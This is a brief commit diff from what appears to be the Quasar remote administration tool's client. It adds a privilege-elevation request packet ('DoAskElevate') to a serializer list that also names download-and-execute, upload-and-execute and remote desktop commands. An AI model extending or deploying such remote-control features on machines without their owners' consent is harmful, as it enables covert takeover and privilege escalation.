c68c111bb962d9dbd2003a0eaa3ab75f2c410f96
LostSoulFly <Bradley.Shaner@gmail.com>
2016-03-18 12:34:26 -0400

    Update QuasarClient Serializer for DoAskElevate

--- Client/Core/Networking/QuasarClient.cs
+++ Client/Core/Networking/QuasarClient.cs
@@ -30,6 +30,7 @@ namespace xClient.Core.Networking
                 typeof (Packets.ServerPackets.DoClientDisconnect),
                 typeof (Packets.ServerPackets.DoClientReconnect),
                 typeof (Packets.ServerPackets.DoClientUninstall),
+                typeof (Packets.ServerPackets.DoAskElevate),
                 typeof (Packets.ServerPackets.DoDownloadAndExecute),
                 typeof (Packets.ServerPackets.DoUploadAndExecute),
                 typeof (Packets.ServerPackets.GetDesktop),
